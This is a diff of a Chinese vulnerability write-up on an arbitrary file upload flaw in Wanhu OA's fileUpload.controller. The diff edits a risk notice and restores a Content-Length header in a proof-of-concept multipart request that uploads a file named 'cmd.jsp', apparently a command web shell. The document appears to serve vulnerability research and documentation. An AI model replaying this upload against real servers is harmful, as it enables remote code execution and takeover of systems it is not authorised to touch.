@@ -39,7 +39,7 @@ schema_version: "1"
 
 ## 操作风险
 
-文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -75,6 +75,7 @@ Accept-Encoding: gzip, deflate
 Accept: */*
 Connection: Keep-Alive
 Content-Type: multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0
+Content-Length: 773
 
 --KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0
 Content-Disposition: form-data; name="file"; filename="cmd.jsp"
@@ -85,7 +86,7 @@ Content-Transfer-Encoding: binary
 --KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--
 ```
 
-> 请求长度说明：原资料 Content-Length 为 773；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 773；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![img](./.resource/万户OA-fileUpload.controller-任意文件上传漏洞/media/1628348700247-9ac78c6c-b56f-4137-a0b3-ba3b13733c19.png)
 
